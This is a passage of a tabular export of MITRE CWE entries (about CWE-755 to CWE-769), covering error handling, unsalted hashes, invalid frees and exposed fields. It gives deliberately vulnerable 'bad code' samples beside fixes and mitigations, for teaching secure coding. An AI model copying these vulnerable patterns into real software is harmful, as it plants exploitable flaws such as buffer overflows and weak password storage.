50)DoDangerousOperation(MyArray(20))In .NET, it is not uncommon for programmers to misunderstand Read() and related methods that are part of many System.IO classes. The stream and reader classes do not consider it to be unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested.Example 7This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.(bad code)Example Language:Cvoid host_lookup(char *user_supplied_addr){struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);/*routine that ensures user_supplied_addr is in the right format for conversion */validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);}If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference (CWE-476) would then occur in the call to strcpy().Note that this code is also vulnerable to a buffer overflow (CWE-119).Example 8In the following C/C++ example the method outputStringToFile opens a file in the local filesystem and outputs a string to the file. The input parameters output and filename contain the string to output to the file and the name of the file respectively.(bad code)Example Language:C++int outputStringToFile(char *output, char *filename) {openFileToWrite(filename);writeToFile(output);closeFile(filename);}However, this code does not check the return values of the methods openFileToWrite, writeToFile, closeFile to verify that the file was properly opened and closed and that the string was successfully written to the file. The return values for these methods should be checked to determine if the method was successful and allow for detection of errors or unexpected conditions as in the following example.(good code)Example Language:C++int outputStringToFile(char *output, char *filename) {int isOutput = SUCCESS;int isOpen = openFileToWrite(filename);if (isOpen == FAIL) {printf(""Unable to open file %s"", filename);isOutput = FAIL;}else {int isWrite = writeToFile(output);if (isWrite == FAIL) {printf(""Unable to write to file %s"", filename);isOutput = FAIL;}int isClose = closeFile(filename);if (isClose == FAIL)isOutput = FAIL;}return isOutput;}Example 9In the following Java example the method readFromFile uses a FileReader object to read the contents of a file. The FileReader object is created using the File object readFile, the readFile object is initialized using the setInputFile method. The setInputFile method should be called before calling the readFromFile method.(bad code)Example Language:Javaprivate File readFile = null;public void setInputFile(String inputFile) {// create readFile File object from string containing name of file}public void readFromFile() {try {reader = new FileReader(readFile);// read input file} catch (FileNotFoundException ex) {...}}However, the readFromFile method does not check to see if the readFile object is null, i.e. has not been initialized, before creating the FileReader object and reading from the input file. The readFromFile method should verify whether the readFile object is null and output an error message and raise an exception if the readFile object is null, as in the following code.(good code)Example Language:Javaprivate File readFile = null;public void setInputFile(String inputFile) {// create readFile File object from string containing name of file}public void readFromFile() {try {if (readFile == null) {System.err.println(""Input file has not been set, call setInputFile method before calling openInputFile"");throw NullPointerException;}reader = new FileReader(readFile);// read input file} catch (FileNotFoundException ex) {...}catch (NullPointerException ex) {...}}","Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Choose languages with features such as exception handling that force the programmer to anticipate unusual conditions that may generate exceptions. Custom exceptions may need to be developed to handle unusual business-logic conditions. Be careful not to pass sensitive exceptions back to the user (CWE-209,CWE-248).Phase:  ImplementationCheck the results of all functions that return a value and verify that the value is expected.Effectiveness: HighNote:Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment.Phase:  ImplementationIf using exception handling, catch and throw specific exceptions instead of overly-general exceptions (CWE-396,CWE-397). Catch and handle exceptions as locally as possible so that exceptions do not propagate too far up the call stack (CWE-705). Avoid unchecked or uncaught exceptions where feasible (CWE-248).Effectiveness: HighNote:Using specific exceptions, and ensuring that exceptions are checked, helps programmers to anticipate and appropriately handle many unusual events that could occur.Phase:  ImplementationEnsure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.Exposing additional information to a potential attacker in the context of an exceptional condition can help the attacker determine what attack vectors are most likely to succeed beyond DoS.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Note:Performing extensive input validation does not help with handling unusual conditions, but it will minimize their occurrences and will make it more difficult for attackers to trigger them.Phases:  Architecture and Design; ImplementationIf the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.Phase:  Architecture and DesignUse system limits, which should help to prevent resource exhaustion. However, the product should still handle low resource conditions since they may still occur."
CWE-755: Improper Handling of Exceptional Conditions,The product does not handle or incorrectly handles an exceptional condition.,"Scope: Other, Impact: Technical Impact:Other, Likelihood: ","Example 1The following example attempts to resolve a hostname.(bad code)Example Language:Javaprotected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {String ip = req.getRemoteAddr();InetAddress addr = InetAddress.getByName(ip);...out.println(""hello "" + addr.getHostName());}A DNS lookup failure will cause the Servlet to throw an exception.Example 2The following example attempts to allocate memory for a character. After the call to malloc, an if statement is used to check whether the malloc function failed.(bad code)Example Language:Cfoo=malloc(sizeof(char)); //the next line checks to see if malloc failedif (foo==NULL) {//We do nothing so we just ignore the error.}The conditional successfully detects a NULL return value from malloc indicating a failure, however it does not do anything to handle the problem. Unhandled errors may have unexpected results and may cause the program to crash or terminate.Instead, the if block should contain statements that either attempt to fix the problem or notify the user that an error has occurred and continue processing or perform some cleanup and gracefully terminate the program. The following example notifies the user that the malloc function did not allocate the required memory resources and returns an error code.(good code)Example Language:Cfoo=malloc(sizeof(char)); //the next line checks to see if malloc failedif (foo==NULL) {printf(""Malloc failed to allocate memory resources"");return -1;}Example 3The following code mistakenly catches a NullPointerException.(bad code)Example Language:Javatry {mysteryMethod();} catch (NullPointerException npe) {}",无可能的缓解方案
CWE-756: Missing Custom Error Page,"The product does not return custom error pages to the user, possibly exposing sensitive information.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataAttackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application., Likelihood: ","Example 1In the snippet below, an unchecked runtime exception thrown from within the try block may cause the container to display its default error page (which may contain a full stack trace, among other things).(bad code)Example Language:JavaPublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {try {...} catch (ApplicationSpecificException ase) {logger.error(""Caught: "" + ase.toString());}}Example 2The mode attribute of the <customErrors> tag in the Web.config file defines whether custom or default error pages are used.In the following insecure ASP.NET application setting, custom error message mode is turned off. An ASP.NET error message with detailed stack trace and platform versions will be returned.(bad code)Example Language:ASP.NET<customErrors mode=""Off"" />A more secure setting is to set the custom error message mode for remote users only. No defaultRedirect error page is specified. The local user on the web server will see a detailed stack trace. For remote users, an ASP.NET error message with the server customError configuration setting and the platform version will be returned.(good code)Example Language:ASP.NET<customErrors mode=""RemoteOnly"" />Another secure option is to set the mode attribute of the <customErrors> tag to use a custom page as follows:(good code)Example Language:ASP.NET<customErrors mode=""On"" defaultRedirect=""YourErrorPage.htm"" />",无可能的缓解方案
CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade'),"A protocol or its implementation supports interaction between multiple actors and allows those actors to negotiate which algorithm should be used as a protection mechanism such as encryption or authentication, but it does not select the strongest algorithm that is available to both parties.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,无可能的缓解方案
"CWE-758: Reliance on Undefined, Unspecified, or Implementation-Defined Behavior","The product uses an API function, data structure, or other entity in a way that relies on properties that are not always guaranteed to hold for that entity.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ","Example 1This code assumes a particular function will always be found at a particular address. It assigns a pointer to that address and calls the function.(bad code)Example Language:Cint (*pt2Function) (float, char, char)=0x08040000;int result2 = (*pt2Function) (12, 'a', 'b');// Here we can inject code to execute.The same function may not always be found at the same memory address. This could lead to a crash, or an attacker may alter the memory at the expected address, leading to arbitrary code execution.Example 2The following function returns a stack address.(bad code)Example Language:Cchar* getName() {char name[STR_MAX];fillInName(name);return name;}",无可能的缓解方案
CWE-759: Use of a One-Way Hash without a Salt,"The product uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the product does not also use a salt as part of the input.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityIf an attacker can gain access to the hashes, then the lack of a salt makes it easier to conduct brute force attacks using techniques such as rainbow tables., Likelihood: ","Example 1In both of these examples, a user is logged in if their given password matches a stored password:(bad code)Example Language:Cunsigned char *check_passwd(char *plaintext) {ctext = simple_digest(""sha1"",plaintext,strlen(plaintext), ... );//Login if hash matches stored hashif (equal(ctext, secret_password())) {login_user();}}(bad code)Example Language:JavaString plainText = new String(plainTextIn);MessageDigest encer = MessageDigest.getInstance(""SHA"");encer.update(plainTextIn);byte[] digest = password.digest();//Login if hash matches stored hashif (equal(digest,secret_password())) {login_user();}This code relies exclusively on a password mechanism (CWE-309) using only one factor of authentication (CWE-308). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (CWE-328). It also does not use a salt (CWE-759).Example 2In this example, a new user provides a new username and password to create an account. The program hashes the new user's password then stores it in a database.(bad code)Example Language:Pythondef storePassword(userName,Password):hasher = hashlib.new('md5')hasher.update(Password)hashedPassword = hasher.digest()# UpdateUserLogin returns True on success, False otherwisereturn updateUserLogin(userName,hashedPassword)While it is good to avoid storing a cleartext password, the program does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password if the database is compromised.Fixing this is as simple as providing a salt to the hashing function on initialization:(good code)Example Language:Pythondef storePassword(userName,Password):hasher = hashlib.new('md5',b'SaltGoesHere')hasher.update(Password)hashedPassword = hasher.digest()# UpdateUserLogin returns True on success, False otherwisereturn updateUserLogin(userName,hashedPassword)Note that regardless of the usage of a salt, the md5 hash is no longer considered secure, so this example still exhibitsCWE-327.","Phase:  Architecture and DesignUse an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (""stretching"") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.Effectiveness: HighPhase:  Architecture and DesignIf a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.Effectiveness: LimitedNote:Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware.Phases:  Implementation; Architecture and DesignWhen using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."
CWE-760: Use of a One-Way Hash with a Predictable Salt,"The product uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the product uses a predictable salt as part of the input.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,"Phase:  Architecture and DesignUse an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (""stretching"") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.Effectiveness: HighPhase:  ImplementationIf a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.Effectiveness: LimitedNote:Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware."
CWE-761: Free of Pointer not at Start of Buffer,"The product calls free() on a pointer to a memory resource that was allocated on the heap, but the pointer is not at the start of the buffer.","Scope: IntegrityAvailabilityConfidentiality, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or Restart; Execute Unauthorized Code or Commands, Likelihood: ","Example 1In this example, the programmer dynamically allocates a buffer to hold a string and then searches for a specific character. After completing the search, the programmer attempts to release the allocated memory and return SUCCESS or FAILURE to the caller. Note: for simplification, this example uses a hard-coded ""Search Me!"" string and a constant string length of 20.(bad code)Example Language:C#define SUCCESS (1)#define FAILURE (0)int contains_char(char c){char *str;str = (char*)malloc(20*sizeof(char));strcpy(str, ""Search Me!"");while( *str != NULL){if( *str == c ){/* matched char, free string and return success */free(str);return SUCCESS;}/* didn't match yet, increment pointer and try next char */str = str + 1;}/* we did not match the char in the string, free mem and return failure */free(str);return FAILURE;}However, if the character is not at the beginning of the string, or if it is not in the string at all, then the pointer will not be at the start of the buffer when the programmer frees it.Instead of freeing the pointer in the middle of the buffer, the programmer can use an indexing pointer to step through the memory or abstract the memory calculations by using array indexing.(good code)Example Language:C#define SUCCESS (1)#define FAILURE (0)int cointains_char(char c){char *str;int i = 0;str = (char*)malloc(20*sizeof(char));strcpy(str, ""Search Me!"");while( i < strlen(str) ){if( str[i] == c ){/* matched char, free string and return success */free(str);return SUCCESS;}/* didn't match yet, increment pointer and try next char */i = i + 1;}/* we did not match the char in the string, free mem and return failure */free(str);return FAILURE;}Example 2This code attempts to tokenize a string and place it into an array using the strsep function, which inserts a \0 byte in place of whitespace or a tab character. After finishing the loop, each string in the AP array points to a location within the input string.(bad code)Example Language:Cchar **ap, *argv[10], *inputstring;for (ap = argv; (*ap = strsep(&inputstring, "" \t"")) != NULL;)if (**ap != '\0')if (++ap >= &argv[10])break;/.../free(ap[4]);Since strsep is not allocating any new memory, freeing an element in the middle of the array is equivalent to free a pointer in the middle of inputstring.Example 3Consider the following code in the context of a parsing application to extract commands out of user data. The intent is to parse each command and add it to a queue of commands to be executed, discarding each malformed entry.(bad code)Example Language:C//hardcode input length for simplicitychar* input = (char*) malloc(40*sizeof(char));char *tok;char* sep = "" \t"";get_user_input( input );/* The following loop will parse and process each token in the input string */tok = strtok( input, sep);while( NULL != tok ){if( isMalformed( tok ) ){/* ignore and discard bad data */free( tok );}else{add_to_command_queue( tok );}tok = strtok( NULL, sep));}While the above code attempts to free memory associated with bad commands, since the memory was all allocated in one chunk, it must all be freed together.One way to fix this problem would be to copy the commands into a new memory location before placing them in the queue. Then, after all commands have been processed, the memory can safely be freed.(good code)Example Language:C//hardcode input length for simplicitychar* input = (char*) malloc(40*sizeof(char));char *tok, *command;char* sep = "" \t"";get_user_input( input );/* The following loop will parse and process each token in the input string */tok = strtok( input, sep);while( NULL != tok ){if( !isMalformed( command ) ){/* copy and enqueue good data */command = (char*) malloc( (strlen(tok) + 1) * sizeof(char) );strcpy( command, tok );add_to_command_queue( command );}tok = strtok( NULL, sep));}free( input )","Phase:  ImplementationWhen utilizing pointer arithmetic to traverse a buffer, use a separate variable to track progress through memory and preserve the originally allocated address for later freeing.Phase:  ImplementationWhen programming in C++, consider using smart pointers provided by the boost library to help correctly and consistently manage memory.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, glibc in Linux provides protection against free of invalid pointers.Phase:  Architecture and DesignUse a language that provides abstractions for memory allocation and deallocation.Phase:  TestingUse a tool that dynamically detects memory management problems, such as valgrind."
CWE-762: Mismatched Memory Management Routines,"The product attempts to return a memory resource to the system, but it calls a release function that is not compatible with the function that was originally used to allocate that resource.","Scope: IntegrityAvailabilityConfidentiality, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or Restart; Execute Unauthorized Code or Commands, Likelihood: ","Example 1This example allocates a BarObj object using the new operator in C++, however, the programmer then deallocates the object using free(), which may lead to unexpected behavior.(bad code)Example Language:C++void foo(){BarObj *ptr = new BarObj()/* do some work with ptr here */...free(ptr);}Instead, the programmer should have either created the object with one of the malloc family functions, or else deleted the object with the delete operator.(good code)Example Language:C++void foo(){BarObj *ptr = new BarObj()/* do some work with ptr here */...delete ptr;}Example 2In this example, the program does not use matching functions such as malloc/free, new/delete, and new[]/delete[] to allocate/deallocate the resource.(bad code)Example Language:C++class A {void foo();};void A::foo(){int *ptr;ptr = (int*)malloc(sizeof(int));delete ptr;}Example 3In this example, the program calls the delete[] function on non-heap memory.(bad code)Example Language:C++class A{void foo(bool);};void A::foo(bool heap) {int localArray[2] = {11,22};int *p = localArray;if (heap){p = new int[2];}delete[] p;}","Phase:  ImplementationOnly call matching memory management functions. Do not mix and match routines. For example, when you allocate a buffer with malloc(), dispose of the original pointer with free().Phase:  ImplementationStrategy:  Libraries or FrameworksChoose a language or tool that provides automatic memory management, or makes manual memory management less error-prone.For example, glibc in Linux provides protection against free of invalid pointers.When using Xcode to target OS X or iOS, enable automatic reference counting (ARC) [REF-391].To help correctly and consistently manage memory when programming in C++, consider using a smart pointer class such as std::auto_ptr (defined by ISO/IEC ISO/IEC 14882:2003), std::shared_ptr and std::unique_ptr (specified by an upcoming revision of the C++ standard, informally referred to as C++ 1x), or equivalent solutions such as Boost.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, glibc in Linux provides protection against free of invalid pointers.Phase:  Architecture and DesignUse a language that provides abstractions for memory allocation and deallocation.Phase:  TestingUse a tool that dynamically detects memory management problems, such as valgrind."
CWE-763: Release of Invalid Pointer or Reference,"The product attempts to return a memory resource to the system, but it calls the wrong release function or calls the appropriate release function incorrectly.","Scope: IntegrityAvailabilityConfidentiality, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or Restart; Execute Unauthorized Code or CommandsThis weakness may result in the corruption of memory, and perhaps instructions, possibly leading to a crash. If the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code., Likelihood: ","Example 1This code attempts to tokenize a string and place it into an array using the strsep function, which inserts a \0 byte in place of whitespace or a tab character. After finishing the loop, each string in the AP array points to a location within the input string.(bad code)Example Language:Cchar **ap, *argv[10], *inputstring;for (ap = argv; (*ap = strsep(&inputstring, "" \t"")) != NULL;)if (**ap != '\0')if (++ap >= &argv[10])break;/.../free(ap[4]);Since strsep is not allocating any new memory, freeing an element in the middle of the array is equivalent to free a pointer in the middle of inputstring.Example 2This example allocates a BarObj object using the new operator in C++, however, the programmer then deallocates the object using free(), which may lead to unexpected behavior.(bad code)Example Language:C++void foo(){BarObj *ptr = new BarObj()/* do some work with ptr here */...free(ptr);}Instead, the programmer should have either created the object with one of the malloc family functions, or else deleted the object with the delete operator.(good code)Example Language:C++void foo(){BarObj *ptr = new BarObj()/* do some work with ptr here */...delete ptr;}Example 3In this example, the programmer dynamically allocates a buffer to hold a string and then searches for a specific character. After completing the search, the programmer attempts to release the allocated memory and return SUCCESS or FAILURE to the caller. Note: for simplification, this example uses a hard-coded ""Search Me!"" string and a constant string length of 20.(bad code)Example Language:C#define SUCCESS (1)#define FAILURE (0)int contains_char(char c){char *str;str = (char*)malloc(20*sizeof(char));strcpy(str, ""Search Me!"");while( *str != NULL){if( *str == c ){/* matched char, free string and return success */free(str);return SUCCESS;}/* didn't match yet, increment pointer and try next char */str = str + 1;}/* we did not match the char in the string, free mem and return failure */free(str);return FAILURE;}However, if the character is not at the beginning of the string, or if it is not in the string at all, then the pointer will not be at the start of the buffer when the programmer frees it.Instead of freeing the pointer in the middle of the buffer, the programmer can use an indexing pointer to step through the memory or abstract the memory calculations by using array indexing.(good code)Example Language:C#define SUCCESS (1)#define FAILURE (0)int cointains_char(char c){char *str;int i = 0;str = (char*)malloc(20*sizeof(char));strcpy(str, ""Search Me!"");while( i < strlen(str) ){if( str[i] == c ){/* matched char, free string and return success */free(str);return SUCCESS;}/* didn't match yet, increment pointer and try next char */i = i + 1;}/* we did not match the char in the string, free mem and return failure */free(str);return FAILURE;}Example 4Consider the following code in the context of a parsing application to extract commands out of user data. The intent is to parse each command and add it to a queue of commands to be executed, discarding each malformed entry.(bad code)Example Language:C//hardcode input length for simplicitychar* input = (char*) malloc(40*sizeof(char));char *tok;char* sep = "" \t"";get_user_input( input );/* The following loop will parse and process each token in the input string */tok = strtok( input, sep);while( NULL != tok ){if( isMalformed( tok ) ){/* ignore and discard bad data */free( tok );}else{add_to_command_queue( tok );}tok = strtok( NULL, sep));}While the above code attempts to free memory associated with bad commands, since the memory was all allocated in one chunk, it must all be freed together.One way to fix this problem would be to copy the commands into a new memory location before placing them in the queue. Then, after all commands have been processed, the memory can safely be freed.(good code)Example Language:C//hardcode input length for simplicitychar* input = (char*) malloc(40*sizeof(char));char *tok, *command;char* sep = "" \t"";get_user_input( input );/* The following loop will parse and process each token in the input string */tok = strtok( input, sep);while( NULL != tok ){if( !isMalformed( command ) ){/* copy and enqueue good data */command = (char*) malloc( (strlen(tok) + 1) * sizeof(char) );strcpy( command, tok );add_to_command_queue( command );}tok = strtok( NULL, sep));}free( input )","Phase:  ImplementationOnly call matching memory management functions. Do not mix and match routines. For example, when you allocate a buffer with malloc(), dispose of the original pointer with free().Phase:  ImplementationWhen programming in C++, consider using smart pointers provided by the boost library to help correctly and consistently manage memory.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, glibc in Linux provides protection against free of invalid pointers.Phase:  Architecture and DesignUse a language that provides abstractions for memory allocation and deallocation.Phase:  TestingUse a tool that dynamically detects memory management problems, such as valgrind."
CWE-764: Multiple Locks of a Critical Resource,"The product locks a critical resource more times than intended, leading to an unexpected state in the system.","Scope: AvailabilityIntegrity, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Crash, Exit, or Restart; Unexpected State, Likelihood: ",无示范例子,"Phase:  ImplementationWhen locking and unlocking a resource, try to be sure that all control paths through the code in which the resource is locked one or more times correspond to exactly as many unlocks. If the software acquires a lock and then determines it is not able to perform its intended behavior, be sure to release the lock(s) before waiting for conditions to improve. Reacquire the lock(s) before trying again."
CWE-765: Multiple Unlocks of a Critical Resource,"The product unlocks a critical resource more times than intended, leading to an unexpected state in the system.","Scope: AvailabilityIntegrity, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Modify Memory; Unexpected State, Likelihood: ",无示范例子,"Phase:  ImplementationWhen locking and unlocking a resource, try to be sure that all control paths through the code in which the resource is locked one or more times correspond to exactly as many unlocks. If the product acquires a lock and then determines it is not able to perform its intended behavior, be sure to release the lock(s) before waiting for conditions to improve. Reacquire the lock(s) before trying again."
CWE-766: Critical Data Element Declared Public,"The product declares a critical variable, field, or member to be public when intended security policy requires it to be private.","Scope: IntegrityConfidentiality, Impact: Technical Impact:Read Application Data; Modify Application DataMaking a critical variable public allows anyone with access to the object in which the variable is contained to alter or read the value., Likelihood: ; Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ","Example 1The following example declares a critical variable public, making it accessible to anyone with access to the object in which it is contained.(bad code)Example Language:C++public: char* password;Instead, the critical data should be declared private.(good code)Example Language:C++private: char* password;Even though this example declares the password to be private, there are other possible issues with this implementation, such as the possibility of recovering the password from process memory (CWE-257).Example 2The following example shows a basic user account class that includes member variables for the username and password as well as a public constructor for the class and a public method to authorize access to the user account.(bad code)Example Language:C++#define MAX_PASSWORD_LENGTH 15#define MAX_USERNAME_LENGTH 15class UserAccount{public:UserAccount(char *username, char *password){if ((strlen(username) > MAX_USERNAME_LENGTH) ||(strlen(password) > MAX_PASSWORD_LENGTH)) {ExitError(""Invalid username or password"");}strcpy(this->username, username);strcpy(this->password, password);}int authorizeAccess(char *username, char *password){if ((strlen(username) > MAX_USERNAME_LENGTH) ||(strlen(password) > MAX_PASSWORD_LENGTH)) {ExitError(""Invalid username or password"");}// if the username and password in the input parameters are equal to// the username and password of this account class then authorize accessif (strcmp(this->username, username) ||strcmp(this->password, password))return 0;// otherwise do not authorize accesselsereturn 1;}char username[MAX_USERNAME_LENGTH+1];char password[MAX_PASSWORD_LENGTH+1];};However, the member variables username and password are declared public and therefore will allow access and changes to the member variables to anyone with access to the object. These member variables should be declared private as shown below to prevent unauthorized access and changes.(good code)Example Language:C++class UserAccount{public:...private:char username[MAX_USERNAME_LENGTH+1];char password[MAX_PASSWORD_LENGTH+1];};","Phase:  ImplementationData should be private, static, and final whenever possible. This will assure that your code is protected by instantiating early, preventing access, and preventing tampering."
CWE-767: Access to Critical Private Variable via Public Method,The product defines a public method that reads or modifies a private variable.,"Scope: IntegrityOther, Impact: Technical Impact:Modify Application Data; Other, Likelihood: ","Example 1The following example declares a critical variable to be private, and then allows the variable to be modified by public methods.(bad code)Example Language:C++private: float price;public: void changePrice(float newPrice) {price = newPrice;}Example 2The following example could be used to implement a user forum where a single user (UID) can switch between multiple profiles (PID).(bad code)Example Language:Javapublic class Client {private int UID;public int PID;private String userName;public Client(String userName){PID = getDefaultProfileID();UID = mapUserNametoUID( userName );this.userName = userName;}public void setPID(int ID) {UID = ID;}}The programmer implemented setPID with the intention of modifying the PID variable, but due to a typo. accidentally specified the critical variable UID instead. If the program allows profile IDs to be between 1 and 10, but a UID of 1 means the user is treated as an admin, then a user could gain administrative privileges as a result of this typo.",Phase:  ImplementationUse class accessor and mutator methods appropriately. Perform validation when accepting data from a public method that is intended to modify a critical private variable. Also be sure that appropriate access controls are being applied when a public method interfaces with critical data.
CWE-768: Incorrect Short Circuit Evaluation,"The product contains a conditional statement with multiple logical expressions in which one of the non-leading expressions may produce side effects. This may lead to an unexpected state in the program after the execution of the conditional, because short-circuiting logic may prevent the side effects from occurring.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Varies by ContextWidely varied consequences are possible if an attacker is aware of an unexpected state in the product after a conditional. It may lead to information exposure, a system crash, or even complete attacker control of the system., Likelihood: ","Example 1The following function attempts to take a size value from a user and allocate an array of that size (we ignore bounds checking for simplicity). The function tries to initialize each spot with the value of its index, that is, A[len-1] = len - 1; A[len-2] = len - 2; ... A[1] = 1; A[0] = 0; However, since the programmer uses the prefix decrement operator, when the conditional is evaluated with i == 1, the decrement will result in a 0 value for the first part of the predicate, causing the second portion to be bypassed via short-circuit evaluation. This means we cannot be sure of what value will be in A[0] when we return the array to the user.(bad code)Example Language:C#define PRIV_ADMIN 0#define PRIV_REGULAR 1typedef struct{int privileges;int id;} user_t;user_t *Add_Regular_Users(int num_users){user_t* users = (user_t*)calloc(num_users, sizeof(user_t));int i = num_users;while( --i && (users[i].privileges = PRIV_REGULAR) ){users[i].id = i;}return users;}int main(){user_t* test;int i;test = Add_Regular_Users(25);for(i = 0; i < 25; i++) printf(""user %d has privilege level %d\n"", test[i].id, test[i].privileges);}When compiled and run, the above code will output a privilege level of 1, or PRIV_REGULAR for every user but the user with id 0 since the prefix increment operator used in the if statement will reach zero and short circuit before setting the 0th user's privilege level. Since we used calloc, this privilege will be set to 0, or PRIV_ADMIN.",Phase:  ImplementationMinimizing the number of statements in a conditional that produce side effects will help to prevent the likelihood of short circuit evaluation to alter control flow in an unexpected way.
CWE-769: DEPRECATED: Uncontrolled File Descriptor Consumption,This entry has been deprecated because it was a duplicate ofCWE-774. All content has been transferred toCWE-774.,无常见后果信息,无示范例子,无可能的缓解方案
